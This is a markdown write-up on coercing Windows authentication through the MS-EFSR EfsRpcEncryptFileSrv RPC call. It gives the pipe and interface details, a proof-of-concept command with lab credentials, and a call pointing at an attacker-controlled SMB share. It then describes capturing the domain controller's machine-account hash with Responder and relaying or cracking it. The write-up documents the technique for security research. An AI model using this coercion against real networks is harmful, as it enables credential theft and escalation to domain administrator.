# MS-EFSR - Remote call to EfsRpcEncryptFileSrv (opnum 4)

## Summary

+ **Protocol**: [[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)

+ **Function name**: [`EfsRpcEncryptFileSrv`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/0d599976-758c-4dbd-ac8c-c9db2a922d76)

+ **Function operation number**: `4`

+ **RPC Interfaces**:
   + Interface 1:
     - uuid=`c681d488-d850-11d0-8c52-00c04fd90f7e`
     - version=`1.0`
     - Accessible through:
       + SMB named pipe: `\PIPE\lsarpc`
       + SMB named pipe: `\PIPE\lsass`
       + SMB named pipe: `\PIPE\netlogon`
       + SMB named pipe: `\PIPE\samr`
   + Interface 2:
     - uuid=`df1941c5-fe89-4e79-bf10-463657acf44d`
     - version=`1.0`
     - Accessible through:
       + SMB named pipe: `\PIPE\efsrpc`


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `\pipe\lsarpc` and bind to the desired [`MS-EFSR`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31) protocol (with uuid `c681d488-d850-11d0-8c52-00c04fd90f7e` and version `1.0`) in order to perform remote procedure calls to functions in the [`MS-EFSR`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\PIPE\lsarpc`. This pipe is connected to the protocol [[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31) and allows to call RPC functions of this protocol. It will then call the remote [`EfsRpcEncryptFileSrv`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/0d599976-758c-4dbd-ac8c-c9db2a922d76) function on the Windows Server (192.168.2.1) with the following parameters:

```cpp
EfsRpcEncryptFileSrv("\\\\192.168.2.51\\share\\file.txt\x00")
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share\file.txt` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!

## Accepted UNC paths

By using [Coercer](https://github.com/p0dalirius/Coercer) in fuzz mode, we can find the following UNC paths working in this function:

| Protocol | UNC Path |
|----------|----------|

Source: [coercer-fuzz.png](./imgs/coercer-fuzz.png)

---

## Function technical detail

```cpp
long EfsRpcEncryptFileSrv(
    [in] handle_t binding_h,
    [in, string] wchar_t* FileName
);
```

+ **binding_h**: This is an RPC binding handle parameter, as specified in [C706] and [MS-RPCE] section 2.


+ **FileName**: An EFSRPC identifier as specified in section 2.2.1. 

## References

+ Documentation of protocol [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31


+ Documentation of function `EfsRpcEncryptFileSrv`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/0d599976-758c-4dbd-ac8c-c9db2a922d76